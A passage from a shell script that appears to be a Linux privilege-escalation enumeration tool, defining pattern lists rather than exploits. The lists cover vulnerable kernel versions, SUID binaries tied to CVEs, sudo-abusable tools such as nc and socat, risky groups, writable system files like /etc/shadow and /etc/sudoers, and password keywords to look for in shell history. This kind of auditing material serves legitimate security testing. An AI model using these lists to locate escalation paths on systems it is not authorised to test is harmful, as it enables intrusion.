8.1.el5\|2.6.18-348.19.1.el5\|2.6.18-348.21.1.el5\|2.6.18-348.22.1.el5\|2.6.18-348.23.1.el5\|2.6.18-348.25.1.el5\|2.6.18-348.27.1.el5\|2.6.18-348.28.1.el5\|2.6.18-348.29.1.el5\|2.6.18-348.30.1.el5\|2.6.18-348.31.2.el5\|2.6.18-371.el5\|2.6.18-371.1.2.el5\|2.6.18-371.3.1.el5\|2.6.18-371.4.1.el5\|2.6.18-371.6.1.el5\|2.6.18-371.8.1.el5\|2.6.18-371.9.1.el5\|2.6.18-371.11.1.el5\|2.6.18-371.12.1.el5\|2.6.18-398.el5\|2.6.18-400.el5\|2.6.18-400.1.1.el5\|2.6.18-402.el5\|2.6.18-404.el5\|2.6.18-406.el5\|2.6.18-407.el5\|2.6.18-408.el5\|2.6.18-409.el5\|2.6.18-410.el5\|2.6.18-411.el5\|2.6.18-412.el5"
kernelDCW_Rhel6_1="2.6.33.9-rt31.66.el6rt\|2.6.33.9-rt31.74.el6rt\|2.6.33.9-rt31.75.el6rt\|2.6.33.9-rt31.79.el6rt\|3.0.9-rt26.45.el6rt\|3.0.9-rt26.46.el6rt\|3.0.18-rt34.53.el6rt\|3.0.25-rt44.57.el6rt\|3.0.30-rt50.62.el6rt\|3.0.36-rt57.66.el6rt\|3.2.23-rt37.56.el6rt\|3.2.33-rt50.66.el6rt\|3.6.11-rt28.20.el6rt\|3.6.11-rt30.25.el6rt\|3.6.11.2-rt33.39.el6rt\|3.6.11.5-rt37.55.el6rt\|3.8.13-rt14.20.el6rt\|3.8.13-rt14.25.el6rt\|3.8.13-rt27.33.el6rt\|3.8.13-rt27.34.el6rt\|3.8.13-rt27.40.el6rt\|3.10.0-229.rt56.144.el6rt\|3.10.0-229.rt56.147.el6rt\|3.10.0-229.rt56.149.el6rt\|3.10.0-229.rt56.151.el6rt\|3.10.0-229.rt56.153.el6rt\|3.10.0-229.rt56.158.el6rt\|3.10.0-229.rt56.161.el6rt\|3.10.0-229.rt56.162.el6rt\|3.10.0-327.rt56.170.el6rt\|3.10.0-327.rt56.171.el6rt\|3.10.0-327.rt56.176.el6rt\|3.10.0-327.rt56.183.el6rt\|3.10.0-327.rt56.190.el6rt\|3.10.0-327.rt56.194.el6rt\|3.10.0-327.rt56.195.el6rt\|3.10.0-327.rt56.197.el6rt\|3.10.33-rt32.33.el6rt\|3.10.33-rt32.34.el6rt\|3.10.33-rt32.43.el6rt\|3.10.33-rt32.45.el6rt\|3.10.33-rt32.51.el6rt\|3.10.33-rt32.52.el6rt\|3.10.58-rt62.58.el6rt\|3.10.58-rt62.60.el6rt\|2.6.32-71.7.1.el6\|2.6.32-71.14.1.el6\|2.6.32-71.18.1.el6\|2.6.32-71.18.2.el6\|2.6.32-71.24.1.el6\|2.6.32-71.29.1.el6\|2.6.32-71.31.1.el6\|2.6.32-71.34.1.el6\|2.6.32-71.35.1.el6\|2.6.32-71.36.1.el6\|2.6.32-71.37.1.el6\|2.6.32-71.38.1.el6\|2.6.32-71.39.1.el6\|2.6.32-71.40.1.el6\|2.6.32-131.0.15.el6\|2.6.32-131.2.1.el6\|2.6.32-131.4.1.el6\|2.6.32-131.6.1.el6\|2.6.32-131.12.1.el6\|2.6.32-131.17.1.el6\|2.6.32-131.21.1.el6\|2.6.32-131.22.1.el6\|2.6.32-131.25.1.el6\|2.6.32-131.26.1.el6\|2.6.32-131.28.1.el6\|2.6.32-131.29.1.el6\|2.6.32-131.30.1.el6\|2.6.32-131.30.2.el6\|2.6.32-131.33.1.el6\|2.6.32-131.35.1.el6\|2.6.32-131.36.1.el6\|2.6.32-131.37.1.el6\|2.6.32-131.38.1.el6\|2.6.32-131.39.1.el6\|2.6.32-220.el6\|2.6.32-220.2.1.el6\|2.6.32-220.4.1.el6\|2.6.32-220.4.2.el6\|2.6.32-220.4.7.bgq.el6\|2.6.32-220.7.1.el6\|2.6.32-220.7.3.p7ih.el6\|2.6.32-220.7.4.p7ih.el6\|2.6.32-220.7.6.p7ih.el6\|2.6.32-220.7.7.p7ih.el6\|2.6.32-220.13.1.el6\|2.6.32-220.17.1.el6\|2.6.32-220.23.1.el6\|2.6.32-220.24.1.el6\|2.6.32-220.25.1.el6\|2.6.32-220.26.1.el6\|2.6.32-220.28.1.el6\|2.6.32-220.30.1.el6\|2.6.32-220.31.1.el6\|2.6.32-220.32.1.el6\|2.6.32-220.34.1.el6\|2.6.32-220.34.2.el6\|2.6.32-220.38.1.el6\|2.6.32-220.39.1.el6\|2.6.32-220.41.1.el6\|2.6.32-220.42.1.el6\|2.6.32-220.45.1.el6\|2.6.32-220.46.1.el6\|2.6.32-220.48.1.el6\|2.6.32-220.51.1.el6\|2.6.32-220.52.1.el6\|2.6.32-220.53.1.el6\|2.6.32-220.54.1.el6\|2.6.32-220.55.1.el6\|2.6.32-220.56.1.el6\|2.6.32-220.57.1.el6\|2.6.32-220.58.1.el6\|2.6.32-220.60.2.el6\|2.6.32-220.62.1.el6\|2.6.32-220.63.2.el6\|2.6.32-220.64.1.el6\|2.6.32-220.65.1.el6\|2.6.32-220.66.1.el6\|2.6.32-220.67.1.el6\|2.6.32-279.el6\|2.6.32-279.1.1.el6\|2.6.32-279.2.1.el6\|2.6.32-279.5.1.el6\|2.6.32-279.5.2.el6\|2.6.32-279.9.1.el6\|2.6.32-279.11.1.el6\|2.6.32-279.14.1.bgq.el6\|2.6.32-279.14.1.el6\|2.6.32-279.19.1.el6\|2.6.32-279.22.1.el6\|2.6.32-279.23.1.el6\|2.6.32-279.25.1.el6\|2.6.32-279.25.2.el6\|2.6.32-279.31.1.el6\|2.6.32-279.33.1.el6\|2.6.32-279.34.1.el6\|2.6.32-279.37.2.el6\|2.6.32-279.39.1.el6"
kernelDCW_Rhel6_2="2.6.32-279.41.1.el6\|2.6.32-279.42.1.el6\|2.6.32-279.43.1.el6\|2.6.32-279.43.2.el6\|2.6.32-279.46.1.el6\|2.6.32-358.el6\|2.6.32-358.0.1.el6\|2.6.32-358.2.1.el6\|2.6.32-358.6.1.el6\|2.6.32-358.6.2.el6\|2.6.32-358.6.3.p7ih.el6\|2.6.32-358.11.1.bgq.el6\|2.6.32-358.11.1.el6\|2.6.32-358.14.1.el6\|2.6.32-358.18.1.el6\|2.6.32-358.23.2.el6\|2.6.32-358.28.1.el6\|2.6.32-358.32.3.el6\|2.6.32-358.37.1.el6\|2.6.32-358.41.1.el6\|2.6.32-358.44.1.el6\|2.6.32-358.46.1.el6\|2.6.32-358.46.2.el6\|2.6.32-358.48.1.el6\|2.6.32-358.49.1.el6\|2.6.32-358.51.1.el6\|2.6.32-358.51.2.el6\|2.6.32-358.55.1.el6\|2.6.32-358.56.1.el6\|2.6.32-358.59.1.el6\|2.6.32-358.61.1.el6\|2.6.32-358.62.1.el6\|2.6.32-358.65.1.el6\|2.6.32-358.67.1.el6\|2.6.32-358.68.1.el6\|2.6.32-358.69.1.el6\|2.6.32-358.70.1.el6\|2.6.32-358.71.1.el6\|2.6.32-358.72.1.el6\|2.6.32-358.73.1.el6\|2.6.32-358.111.1.openstack.el6\|2.6.32-358.114.1.openstack.el6\|2.6.32-358.118.1.openstack.el6\|2.6.32-358.123.4.openstack.el6\|2.6.32-431.el6\|2.6.32-431.1.1.bgq.el6\|2.6.32-431.1.2.el6\|2.6.32-431.3.1.el6\|2.6.32-431.5.1.el6\|2.6.32-431.11.2.el6\|2.6.32-431.17.1.el6\|2.6.32-431.20.3.el6\|2.6.32-431.20.5.el6\|2.6.32-431.23.3.el6\|2.6.32-431.29.2.el6\|2.6.32-431.37.1.el6\|2.6.32-431.40.1.el6\|2.6.32-431.40.2.el6\|2.6.32-431.46.2.el6\|2.6.32-431.50.1.el6\|2.6.32-431.53.2.el6\|2.6.32-431.56.1.el6\|2.6.32-431.59.1.el6\|2.6.32-431.61.2.el6\|2.6.32-431.64.1.el6\|2.6.32-431.66.1.el6\|2.6.32-431.68.1.el6\|2.6.32-431.69.1.el6\|2.6.32-431.70.1.el6\|2.6.32-431.71.1.el6\|2.6.32-431.72.1.el6\|2.6.32-431.73.2.el6\|2.6.32-431.74.1.el6\|2.6.32-504.el6\|2.6.32-504.1.3.el6\|2.6.32-504.3.3.el6\|2.6.32-504.8.1.el6\|2.6.32-504.8.2.bgq.el6\|2.6.32-504.12.2.el6\|2.6.32-504.16.2.el6\|2.6.32-504.23.4.el6\|2.6.32-504.30.3.el6\|2.6.32-504.30.5.p7ih.el6\|2.6.32-504.33.2.el6\|2.6.32-504.36.1.el6\|2.6.32-504.38.1.el6\|2.6.32-504.40.1.el6\|2.6.32-504.43.1.el6\|2.6.32-504.46.1.el6\|2.6.32-504.49.1.el6\|2.6.32-504.50.1.el6\|2.6.32-504.51.1.el6\|2.6.32-504.52.1.el6\|2.6.32-573.el6\|2.6.32-573.1.1.el6\|2.6.32-573.3.1.el6\|2.6.32-573.4.2.bgq.el6\|2.6.32-573.7.1.el6\|2.6.32-573.8.1.el6\|2.6.32-573.12.1.el6\|2.6.32-573.18.1.el6\|2.6.32-573.22.1.el6\|2.6.32-573.26.1.el6\|2.6.32-573.30.1.el6\|2.6.32-573.32.1.el6\|2.6.32-573.34.1.el6\|2.6.32-642.el6\|2.6.32-642.1.1.el6\|2.6.32-642.3.1.el6\|2.6.32-642.4.2.el6\|2.6.32-642.6.1.el6"
kernelDCW_Rhel7="3.10.0-229.rt56.141.el7\|3.10.0-229.1.2.rt56.141.2.el7_1\|3.10.0-229.4.2.rt56.141.6.el7_1\|3.10.0-229.7.2.rt56.141.6.el7_1\|3.10.0-229.11.1.rt56.141.11.el7_1\|3.10.0-229.14.1.rt56.141.13.el7_1\|3.10.0-229.20.1.rt56.141.14.el7_1\|3.10.0-229.rt56.141.el7\|3.10.0-327.rt56.204.el7\|3.10.0-327.4.5.rt56.206.el7_2\|3.10.0-327.10.1.rt56.211.el7_2\|3.10.0-327.13.1.rt56.216.el7_2\|3.10.0-327.18.2.rt56.223.el7_2\|3.10.0-327.22.2.rt56.230.el7_2\|3.10.0-327.28.2.rt56.234.el7_2\|3.10.0-327.28.3.rt56.235.el7\|3.10.0-327.36.1.rt56.237.el7\|3.10.0-123.el7\|3.10.0-123.1.2.el7\|3.10.0-123.4.2.el7\|3.10.0-123.4.4.el7\|3.10.0-123.6.3.el7\|3.10.0-123.8.1.el7\|3.10.0-123.9.2.el7\|3.10.0-123.9.3.el7\|3.10.0-123.13.1.el7\|3.10.0-123.13.2.el7\|3.10.0-123.20.1.el7\|3.10.0-229.el7\|3.10.0-229.1.2.el7\|3.10.0-229.4.2.el7\|3.10.0-229.7.2.el7\|3.10.0-229.11.1.el7\|3.10.0-229.14.1.el7\|3.10.0-229.20.1.el7\|3.10.0-229.24.2.el7\|3.10.0-229.26.2.el7\|3.10.0-229.28.1.el7\|3.10.0-229.30.1.el7\|3.10.0-229.34.1.el7\|3.10.0-229.38.1.el7\|3.10.0-229.40.1.el7\|3.10.0-229.42.1.el7\|3.10.0-327.el7\|3.10.0-327.3.1.el7\|3.10.0-327.4.4.el7\|3.10.0-327.4.5.el7\|3.10.0-327.10.1.el7\|3.10.0-327.13.1.el7\|3.10.0-327.18.2.el7\|3.10.0-327.22.2.el7\|3.10.0-327.28.2.el7\|3.10.0-327.28.3.el7\|3.10.0-327.36.1.el7\|3.10.0-327.36.2.el7\|3.10.0-229.1.2.ael7b\|3.10.0-229.4.2.ael7b\|3.10.0-229.7.2.ael7b\|3.10.0-229.11.1.ael7b\|3.10.0-229.14.1.ael7b\|3.10.0-229.20.1.ael7b\|3.10.0-229.24.2.ael7b\|3.10.0-229.26.2.ael7b\|3.10.0-229.28.1.ael7b\|3.10.0-229.30.1.ael7b\|3.10.0-229.34.1.ael7b\|3.10.0-229.38.1.ael7b\|3.10.0-229.40.1.ael7b\|3.10.0-229.42.1.ael7b\|4.2.0-0.21.el7"

if [ `echo $UID` ]; then myuid=$UID; elif [ `id -u $(whoami) 2>/dev/null` ]; then myuid=`id -u $(whoami) 2>/dev/null`; elif [ `id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1` ]; then myuid=`id 2>/dev/null | cut -d "=" -f 2 | cut -d "(" -f 1`; fi
if [ $myuid -gt 2147483646 ]; then baduid="\|$myuid"; fi
idB="euid\|egid$baduid"
sudovB="1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"

mounted=`(mount -l || cat /proc/mounts || cat /proc/self/mounts) 2>/dev/null | grep "^/" | cut -d " " -f1 | tr '\n' '|' | sed 's/|/\\\|/g'``cat /etc/fstab | grep -v "#" | grep " / " | cut -d " " -f 1`
mountG="swap\|/cdrom\|/floppy\|/dev/shm"
notmounted=`cat /etc/fstab | grep "^/" | grep -v $mountG | cut -d " " -f1 | grep -v $mounted | tr '\n' '|' | sed 's/|/\\\|/g'`"ImPoSSssSiBlEee"
mountpermsB="[^o]suid\|[^o]user\|[^o]exec"
mountpermsG="nosuid\|nouser\|noexec"

rootcommon="/init$\|upstart-udev-bridge\|udev\|/getty\|cron\|apache2\|java\|tomcat\|/vmtoolsd\|/VGAuthService"

groupsB="(root)\|(shadow)\|(admin)\|(video)"
groupsVB="(sudo)\|(docker)\|(lxd)\|(wheel)\|(disk)\|(lxc)"
knw_grps='(lpadmin)\|(adm)\|(cdrom)\|(plugdev)\|(nogroup)' #https://www.togaware.com/linux/survivor/Standard_Groups.html

sidG="/abuild-sudo$\|/accton$\|/allocate$\|/arping$\|/atq$\|/atrm$\|/authpf$\|/authpf-noip$\|/batch$\|/bbsuid$\|/bsd-write$\|/btsockstat$\|/bwrap$\|/cacaocsc$\|/camel-lock-helper-1.2$\|/ccreds_validate$\|/cdrw$\|/chage$\|/check-foreground-console$\|/chrome-sandbox$\|/chsh$\|/cons.saver$\|/crontab$\|/ct$\|/cu$\|/dbus-daemon-launch-helper$\|/deallocate$\|/desktop-create-kmenu$\|/dma$\|/dmcrypt-get-device$\|/doas$\|/dotlockfile$\|/dotlock.mailutils$\|/dtaction$\|/dtfile$\|/eject$\|/execabrt-action-install-debuginfo-to-abrt-cache$\|/execdbus-daemon-launch-helper$\|/execdma-mbox-create$\|/execlockspool$\|/execlogin_chpass$\|/execlogin_lchpass$\|/execlogin_passwd$\|/execssh-keysign$\|/execulog-helper$\|/expiry$\|/fdformat$\|/fusermount$\|/gnome-pty-helper$\|/glines$\|/gnibbles$\|/gnobots2$\|/gnome-suspend$\|/gnometris$\|/gnomine$\|/gnotski$\|/gnotravex$\|/gpasswd$\|/gpg$\|/gpio$\|/gtali\|/.hal-mtab-lock$\|/imapd$\|/inndstart$\|/kismet_capture$\|/kismet_cap_linux_bluetooth$\|/kismet_cap_linux_wifi$\|/kismet_cap_nrf_mousejack$\|/ksu$\|/list_devices$\|/locate$\|/lock$\|/lockdev$\|/lockfile$\|/login_activ$\|/login_crypto$\|/login_radius$\|/login_skey$\|/login_snk$\|/login_token$\|/login_yubikey$\|/lpd$\|/lpd-port$\|/lppasswd$\|/lpq$\|/lprm$\|/lpset$\|/lxc-user-nic$\|/mahjongg$\|/mail-lock$\|/mailq$\|/mail-touchlock$\|/mail-unlock$\|/mksnap_ffs$\|/mlocate$\|/mlock$\|/mount.cifs$\|/mount.nfs$\|/mount.nfs4$\|/mtr$\|/mutt_dotlock$\|/ncsa_auth$\|/netpr$\|/netreport$\|/netstat$\|/newgidmap$\|/newtask$\|/newuidmap$\|/opieinfo$\|/opiepasswd$\|/pam_auth$\|/pam_extrausers_chkpwd$\|/pam_timestamp_check$\|/pamverifier$\|/pfexec$\|/ping$\|/ping6$\|/pmconfig$\|/polkit-agent-helper-1$\|/polkit-explicit-grant-helper$\|/polkit-grant-helper$\|/polkit-grant-helper-pam$\|/polkit-read-auth-helper$\|/polkit-resolve-exe-helper$\|/polkit-revoke-helper$\|/polkit-set-default-helper$\|/postdrop$\|/postqueue$\|/poweroff$\|/ppp$\|/procmail$\|/pt_chmod$\|/pwdb_chkpwd$\|/quota$\|/remote.unknown$\|/rlogin$\|/rmformat$\|/rnews$\|/run-mailcap$\|/sacadm$\|/same-gnome$\|screen.real$\|/sendmail.sendmail$\|/shutdown$\|/skeyaudit$\|/skeyinfo$\|/skeyinit$\|/slocate$\|/smbmnt$\|/smbumount$\|/smpatch$\|/smtpctl$\|/snap-confine$\|/sperl5.8.8$\|/ssh-agent$\|/ssh-keysign$\|/staprun$\|/startinnfeed$\|/stclient$\|/su$\|/suexec$\|/sys-suspend$\|/telnetlogin$\|/timedc$\|/tip$\|/traceroute6$\|/traceroute6.iputils$\|/trpt$\|/tsoldtlabel$\|/tsoljdslabel$\|/tsolxagent$\|/ufsdump$\|/ufsrestore$\|/umount.cifs$\|/umount.nfs$\|/umount.nfs4$\|/unix_chkpwd$\|/uptime$\|/userhelper$\|/userisdnctl$\|/usernetctl$\|/utempter$\|/utmp_update$\|/uucico$\|/uuglist$\|/uuidd$\|/uuname$\|/uusched$\|/uustat$\|/uux$\|/uuxqt$\|/vmware-user-suid-wrapper$\|/vncserver-x11$\|/volrmmount$\|/w$\|/wall$\|/whodo$\|/write$\|/X$\|/Xorg.wrap$\|/Xsun$\|/Xvnc$"
#Rules: Start path " /", end path "$", divide path and vulnversion "%". SPACE IS ONLY ALLOWED AT BEGINNING, DONT USE IT IN VULN DESCRIPTION
sidB="/apache2%Read_root_passwd__apache2_-f_/etc/shadow(CVE-2019-0211)\
 /at%RTru64_UNIX_4.0g(CVE-2002-1614)\
 /abrt-action-install-debuginfo-to-abrt-cache%CENTOS 7.1/Fedora22
 /chfn$%SuSE_9.3/10\
 /chkey$%Solaris_2.5.1\
 /chkperm$%Solaris_7.0_\
 /chpass$%2Vulns:OpenBSD_6.1_to_OpenBSD 6.6(CVE-2019-19726)--OpenBSD_2.7_i386/OpenBSD_2.6_i386/OpenBSD_2.5_1999/08/06/OpenBSD_2.5_1998/05/28/FreeBSD_4.0-RELEASE/FreeBSD_3.5-RELEASE/FreeBSD_3.4-RELEASE/NetBSD_1.4.2\
 /chpasswd$%SquirrelMail(2004-04)\
 /dtappgather$%Solaris_7_<_11_(SPARC/x86)(CVE-2017-3622)\
 /dtprintinfo$%Solaris_10_(x86)_and_lower_versions_also_SunOS_5.7_to_5.10\
 /dtsession$%Oracle_Solaris_10_1/13_and_earlier(CVE-2020-2696)\
 /eject$%FreeBSD_mcweject_0.9/SGI_IRIX_6.2\
 /ibstat%IBM_AIX_Version_6.1/7.1(09-2013)\
 /kcheckpass$%KDE_3.2.0_<-->_3.4.2_(both_included)\
 /kdesud$%KDE_1.1/1.1.1/1.1.2/1.2\
 /keybase-redirector%CentOS_Linux_release_7.4.1708\
 /login$%IBM_AIX_3.2.5/SGI_IRIX_6.4\
 /lpc$%S.u.S.E_Linux_5.2\
 /lpr$%BSD/OS2.1/FreeBSD2.1.5/NeXTstep4.x/IRIX6.4/SunOS4.1.3/4.1.4(09-1996)\
 /mount$%Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8\
 /movemail$%Emacs(08-1986)\
 /netprint$%IRIX_5.3/6.2/6.3/6.4/6.5/6.5.11\
 /newgrp$%HP-UX_10.20\
 /ntfs-3g$%Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)\
 /passwd$%Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)\
 /pkexec$%Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)\
 /pppd$%Apple_Mac_OSX_10.4.8(05-2007)\
 /pt_chown$%GNU_glibc_2.1/2.1.1_-6(08-1999)\
 /pulseaudio$%(Ubuntu_9.04/Slackware_12.2.0)\
 /rcp$%RedHat_6.2\
 /rdist$%Solaris_10/OpenSolaris\
 /rsh$%Apple_Mac_OSX_10.9.5/10.10.5(09-2015)\
 /screen$%GNU_Screen_4.5.0\
 /sdtcm_convert$%Sun_Solaris_7.0\
 /sendmail$%Sendmail_8.10.1/Sendmail_8.11.x/Linux_Kernel_2.2.x_2.4.0-test1_(SGI_ProPack_1.2/1.3)\
 /sudo$\
 /sudoedit$%Sudo/SudoEdit_1.6.9p21/1.7.2p4/(RHEL_5/6/7/Ubuntu)/Sudo<=1.8.14\
 /tmux%Tmux_1.3_1.4_privesc(CVE-2011-1496)\
 /traceroute$%LBL_Traceroute_[2000-11-15]\
 /ubuntu-core-launcher$%Befre_1.0.27.1(CVE-2016-1580)\
 /umount$%BSD/Linux(08-1996)\
 /umount-loop$%Rocks_Clusters<=4.1(07-2006)\
 /uucp$%Taylor_UUCP_1.0.6\
 /XFree86$%XFree86_X11R6_3.3.x/4.0/4.x/3.3(03-2003)\
 /xlock$%BSD/OS_2.1/DG/UX_7.0/Debian_1.3/HP-UX_10.34/IBM_AIX_4.2/SGI_IRIX_6.4/Solaris_2.5.1(04-1997)\
 /xscreensaver%Solaris_11.x(CVE-2019-3010)\
 /xorg$%Xorg_1.19_to_1.20.x(CVE_2018-14665)/xorg-x11-server<=1.20.3/AIX_7.1_(6.x_to_7.x_should_be_vulnerable)_X11.base.rte<7.1.5.32_and_\
 /xterm$%Solaris_5.5.1_X11R6.3(05-1997)/Debian_xterm_version_222-1etch2(01-2009)"
sidVB='/aria2c$\|/arp$\|/ash$\|/awk$\|/base64$\|/bash$\|/busybox$\|/cat$\|/chmod$\|/chown$\|/cp$\|/csh$\|/curl$\|/cut$\|/dash$\|/date$\|/dd$\|/diff$\|/dmsetup$\|/docker$\|/ed$\|/emacs$\|/env$\|/expand$\|/expect$\|/file$\|/find$\|/flock$\|/fmt$\|/fold$\|/gdb$\|/gimp$\|/git$\|/grep$\|/head$\|/ionice$\|/ip$\|/jjs$\|/jq$\|/jrunscript$\|/ksh$\|/ld.so$\|/less$\|/logsave$\|/lua$\|/make$\|/more$\|/mv$\|/mysql$\|/nano$\|/nc$\|/nice$\|/nl$\|/nmap$\|/node$\|/od$\|/openssl$\|/perl$\|/pg$\|/php$\|/pic$\|/pico$\|/python$\|/readelf$\|/rlwrap$\|/rpm$\|/rpmquery$\|/rsync$\|/rvim$\|/screen-4.5.0\|/scp$\|/sed$\|/setarch$\|/shuf$\|/socat$\|/sort$\|/sqlite3$\|/stdbuf$\|/strace$\|/systemctl$\|/tail$\|/tar$\|/taskset$\|/tclsh$\|/tee$\|/telnet$\|/tftp$\|/time$\|/timeout$\|/ul$\|/unexpand$\|/uniq$\|/unshare$\|/vim$\|/watch$\|/wget$\|/xargs$\|/xxd$\|/zip$\|/zsh$'

sudoVB=" \*\|env_keep+=LD_PRELOAD\|apt-get$\|apt$\|aria2c$\|arp$\|ash$\|awk$\|base64$\|bash$\|busybox$\|cat$\|chmod$\|chown$\|cp$\|cpan$\|cpulimit$\|crontab$\|csh$\|curl$\|cut$\|dash$\|date$\|dd$\|diff$\|dmesg$\|dmsetup$\|dnf$\|docker$\|dpkg$\|easy_install$\|ed$\|emacs$\|env$\|expand$\|expect$\|facter$\|file$\|find$\|flock$\|fmt$\|fold$\|ftp$\|gdb$\|gimp$\|git$\|grep$\|head$\|ionice$\|ip$\|irb$\|jjs$\|journalctl$\|jq$\|jrunscript$\|ksh$\|ld.so$\|less$\|logsave$\|ltrace$\|lua$\|mail$\|make$\|man$\|more$\|mount$\|mtr$\|mv$\|mysql$\|nano$\|nc$\|nice$\|nl$\|nmap$\|node$\|od$\|openssl$\|perl$\|pg$\|php$\|pic$\|pico$\|pip$\|puppet$\|python$\|readelf$\|red$\|rlwrap$\|rpm$\|rpmquery$\|rsync$\|ruby$\|run-mailcap$\|run-parts$\|rvim$\|scp$\|screen$\|script$\|sed$\|service$\|setarch$\|sftp$\|smbclient$\|socat$\|sort$\|sqlite3$\|ssh$\|start-stop-daemon$\|stdbuf$\|strace$\|systemctl$\|tail$\|tar$\|taskset$\|tclsh$\|tcpdump$\|tee$\|telnet$\|tftp$\|time$\|timeout$\|tmux$\|ul$\|unexpand$\|uniq$\|unshare$\|vi$\|vim$\|watch$\|wget$\|wish$\|xargs$\|xxd$\|yum$\|zip$\|zsh$\|zypper$"
sudoB="$(whoami)\|ALL:ALL\|ALL : ALL\|ALL\|NOPASSWD\|/apache2"

sudocapsB="/apt-get\|/apt\|/aria2c\|/arp\|/ash\|/awk\|/base64\|/bash\|/busybox\|/cat\|/chmod\|/chown\|/cp\|/cpan\|/cpulimit\|/crontab\|/csh\|/curl\|/cut\|/dash\|/date\|/dd\|/diff\|/dmesg\|/dmsetup\|/dnf\|/docker\|/dpkg\|/easy_install\|/ed\|/emacs\|/env\|/expand\|/expect\|/facter\|/file\|/find\|/flock\|/fmt\|/fold\|/ftp\|/gdb\|/gimp\|/git\|/grep\|/head\|/ionice\|/ip\|/irb\|/jjs\|/journalctl\|/jq\|/jrunscript\|/ksh\|/ld.so\|/less\|/logsave\|/ltrace\|/lua\|/mail\|/make\|/man\|/more\|/mount\|/mtr\|/mv\|/mysql\|/nano\|/nc\|/nice\|/nl\|/nmap\|/node\|/od\|/openssl\|/perl\|/pg\|/php\|/pic\|/pico\|/pip\|/puppet\|/python\|/readelf\|/red\|/rlwrap\|/rpm\|/rpmquery\|/rsync\|/ruby\|/run-mailcap\|/run-parts\|/rvim\|/scp\|/screen\|/script\|/sed\|/service\|/setarch\|/sftp\|/smbclient\|/socat\|/sort\|/sqlite3\|/ssh\|/start-stop-daemon\|/stdbuf\|/strace\|/systemctl\|/tail\|/tar\|/taskset\|/tclsh\|/tcpdump\|/tee\|/telnet\|/tftp\|/time\|/timeout\|/tmux\|/ul\|/unexpand\|/uniq\|/unshare\|/vi\|/vim\|/watch\|/wget\|/wish\|/xargs\|/xxd\|/yum\|/zip\|/zsh\|/zypper"
capsB="=ep\|cap_dac_read_search\|cap_dac_override"

OLDPATH=$PATH
ADDPATH=":/usr/local/sbin\
 :/usr/local/bin\
 :/usr/sbin\
 :/usr/bin\
 :/sbin\
 :/bin"
spath=":$PATH"
for P in $ADDPATH; do
  if [ ! -z "${spath##*$P*}" ]; then export PATH="$PATH$P" 2>/dev/null; fi
done
writeB="00-header\|10-help-text\|50-motd-news\|80-esm\|91-release-upgrade\|\.sh$\|\./\|/authorized_keys\|/bin/\|/boot/\|/etc/apache2/apache2.conf\|/etc/apache2/httpd.conf\|/etc/hosts.allow\|/etc/hosts.deny\|/etc/httpd/conf/httpd.conf\|/etc/httpd/httpd.conf\|/etc/inetd.conf\|/etc/incron.conf\|/etc/login.defs\|/etc/logrotate.d/\|/etc/modprobe.d/\|/etc/pam.d/\|/etc/php.*/fpm/pool.d/\|/etc/php/.*/fpm/pool.d/\|/etc/rsyslog.d/\|/etc/skel/\|/etc/sysconfig/network-scripts/\|/etc/sysctl.conf\|/etc/sysctl.d/\|/etc/uwsgi/apps-enabled/\|/etc/xinetd.conf\|/etc/xinetd.d/\|/etc/\|/home//\|/lib/\|/log/\|/mnt/\|/root\|/sys/\|/usr/bin\|/usr/games\|/usr/lib\|/usr/local/bin\|/usr/local/games\|/usr/local/sbin\|/usr/sbin\|/sbin/\|/var/log/\|\.timer$\|\.service$\|.socket$"
writeVB="/etc/anacrontab\|/etc/bash.bashrc\|/etc/bash_completion\|/etc/bash_completion.d/\|/etc/cron\|/etc/environment\|/etc/environment.d/\|/etc/group\|/etc/incron.d/\|/etc/init\|/etc/ld.so.conf.d/\|/etc/master.passwd\|/etc/passwd\|/etc/profile.d/\|/etc/profile\|/etc/rc.d\|/etc/shadow\|/etc/sudoers\|/etc/sudoers.d/\|/etc/supervisor/conf.d/\|/etc/supervisor/supervisord.conf\|/etc/systemd\|/etc/sys\|/lib/systemd\|/etc/update-motd.d/\|/root/.ssh/\|/run/systemd\|/usr/lib/systemd\|/systemd/system\|/var/spool/anacron\|/var/spool/cron/crontabs\|"`echo $PATH 2>/dev/null | sed 's/:\.:/:/g' | sed 's/:\.$//g' | sed 's/^\.://g' | sed 's/:/\\\|/g'` #Add Path but remove simple dot in PATH

sh_usrs=`cat /etc/passwd 2>/dev/null | grep -v "^root:" | grep -i "sh$" | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/' | sed 's/|sys|/|sys[\\\s:]|^sys$|/' | sed 's/|daemon|/|daemon[\\\s:]|^daemon$|/' | sed 's/|/\\\|/g'`"ImPoSSssSiBlEee" #Modified bin, sys and daemon so they are not colored everywhere
nosh_usrs=`cat /etc/passwd 2>/dev/null | grep -i -v "sh$" | sort | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/' | sed 's/|/\\\|/g'`"ImPoSSssSiBlEee"
knw_usrs='daemon:\|daemon\s\|^daemon$\|message+\|syslog\|www\|www-data\|mail\|noboby\|Debian-+\|rtkit\|systemd+'
USER=`whoami`
if [ ! "$HOME" ]; then HOME=/home/$USER; fi
GROUPS="ImPoSSssSiBlEee"`groups $USER 2>/dev/null | cut -d ":" -f 2 | tr ' ' '|' | sed 's/|/\\\|/g'`

pwd_inside_history="7z\|unzip\|useradd\|linenum\|mkpasswd\|htpasswd\|openssl\|PASSW\|passw\|shadow\|root\|sudo\|^su\|pkexec\|^ftp\|mongo\|psql\|mysql\|rdesktop\|xfreerdp\|^ssh\|steghide\|@"
